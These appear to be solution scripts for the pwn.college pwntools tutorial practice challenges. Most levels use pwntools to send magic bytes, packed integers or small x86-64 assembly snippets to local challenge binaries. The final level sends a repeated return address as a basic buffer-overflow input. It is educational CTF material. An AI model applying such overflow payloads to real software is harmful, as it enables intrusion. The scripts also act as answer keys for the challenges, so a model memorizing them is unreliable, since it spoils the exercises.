## lvl-0.0

```
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

path = "/challenge/pwntools-tutorials-level0.0"
p = process(path)

payload = b"pokemon"
p.recvuntil(":)\n###\n")
p.sendline(payload)

flag = p.recvline()
flag = flag.decode('utf-8')
print(f"flag is: {flag}")
```

pwn.college{practice}



## lvl-1.0

```
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

path = "/challenge/pwntools-tutorials-level1.0"
p = process(path)

payload = p32(0xdeadbeef)
p.recvuntil(":)\n###\n")
p.sendline(payload)

flag = p.recvline()
flag = flag.decode('utf-8')
print(f"flag is: {flag}")
```

pwn.college{practice}



## lvl-1.1

```
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

path = "/challenge/pwntools-tutorials-level1.0"
p = process(path)

payload = b'\x70' + b'\x15' + p32(123456789) + b"Bypass Me:)"
p.recvuntil(":)\n###\n")
p.sendline(payload)

flag = p.recvline()
flag = flag.decode('utf-8')
print(f"flag is: {flag}")
```

pwn.college{practice}


## lvl-2.0

```
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

context(arch="amd64", os="linux", log_level="info")
path = "/challenge/pwntools-tutorials-level2.0"

p = process(path)
p.sendafter("Please give me your assembly in bytes", asm("mov rax, 0x12345678"))

print_lines(p)
```

pwn.college{practice}



## lvl-2.1

```
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

context(arch="amd64", os="linux", log_level="info")

path = "/challenge/pwntools-tutorials-level2.1"
p = process(path)
p.sendafter("Please give me your assembly in bytes", asm("xchg rax, rbx"))
print_lines(p)
```

pwn.college{practice}



## lvl-2.2

>rax = rax % rbx + rcx - rsi
>
>Assume rbx != 0 (to avoid division by zero)
>
>rax % rbx  =>
>
>
>xor rdx, rdx  ; Clear rdx to ensure high part of dividend is zero for division
>
>div rbx       ; Divide rax by rbx, result is quotient in rax and remainder in rdx
>
>mov rax, rdx  ; Move the remainder to rax
>
>
>add rax, rcx
>
>sub rax, rsi

```
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

context(arch="amd64", os="linux", log_level="info")
path = "/challenge/pwntools-tutorials-level2.2"

p = process(path)

payload = """div rbx
mov rax, rdx
add rax,rcx
sub rax,rsi"""

payload = asm(payload)
p.sendafter("Please give me your assembly in bytes", payload)

print_lines(p)
```

pwn.college{practice}



## lvl-2.3

```
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

context(arch="amd64", os="linux", log_level="info")

path = "/challenge/pwntools-tutorials-level2.3"

p = process(path)

payload = """mov rax, [0x404000]
mov [0x405000],rax"""

payload = asm(payload)
p.sendafter("Please give me your assembly in bytes", payload)

print_lines(p)
```

pwn.college{practice}



## lvl-2.4

>pop rax          ; Pop the top value of the stack into rax
>
>sub rax, rbx     ; Subtract rbx from rax
>
>push rax         ; Push the result back onto the stack

```
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

context(arch="amd64", os="linux", log_level="info")
path = "/challenge/pwntools-tutorials-level2.4"

p = process(path)

payload = """pop rax
sub rax,rbx
push rax"""

payload = asm(payload)
p.sendafter("Please give me your assembly in bytes", payload)

print_lines(p)
```

pwn.college{practice}



## lvl-2.5

>pop rax            ; Pop the top value of the stack into rax
>
>test rax, rax      ; Test if rax is negative
>
>jns no_negation    ; If not negative, jump to no_negation
>
>neg rax            ; If negative, negate rax
>
>no_negation:
>
>push rax           ; Push the (absolute) value back onto the stack

```
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

context(arch="amd64", os="linux", log_level="info")
path = "/challenge/pwntools-tutorials-level2.5"

p = process(path)

payload = """pop rax
test rax,rax
jns p
neg rax
p:
push rax"""

payload = asm(payload)
p.sendafter("Please give me your assembly in bytes", payload)

print_lines(p)
```

pwn.college{practice}



## lvl-2.6

>xor rax, rax      ; Clear rax to store the sum
>
>mov rdi, 1        ; Initialize counter (start at 1)

>loop_start:
>
>
>cmp rdi, rcx      ; Compare counter with rcx
>
>jg end_loop       ; If counter > rcx, jump to end_loop
>
>add rax, rdi      ; Add counter to rax
>
>inc rdi           ; Increment counter
>
>jmp loop_start    ; Jump back to the start of the loop
>
>end_loop:

```
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

context(arch="amd64", os="linux", log_level="info")

path = "/challenge/pwntools-tutorials-level2.6"

p = process(path)

payload = """mov rdi,1

loop:
cmp rdi,rcx
jg end
add rax,rdi
inc rdi
jmp loop

end:
"""

payload = asm(payload)
p.sendafter("Please give me your assembly in bytes", payload)

print_lines(p)
```

pwn.college{practice}



## lvl-3.0

```
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

p = process("/challenge/pwntools-tutorials-level3.0")

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

def create(index,content):
    p.sendlineafter("Choice >>", b"1")
    p.sendlineafter("Input your notebook index:", str(index).encode())
    p.sendafter("Input your notebook content:", content.encode())

def edit(index):
    p.sendlineafter("Choice >>", b"2")
    p.sendafter("Input your notebook index:", str(index).encode())

create(0,"hello ")
create(1,"world,")
create(3,"magic ")
create(5,"notebook")

edit(1)
edit(5)

p.sendlineafter("Choice >>", b"5")

print_lines(p)
```

pwn.college{practice}



## lvl-4

```
from pwn import *
context(arch="amd64", os="linux", log_level="debug")
path = "/challenge/pwntools-tutorials-level4.0"

p = process(path)

hex = 0x00401f0f
payload = p64(hex) * 21
p.recvuntil("Give me your input\n")
p.sendline(payload)
flag = p.recvline()
```


pwn.college{practice}

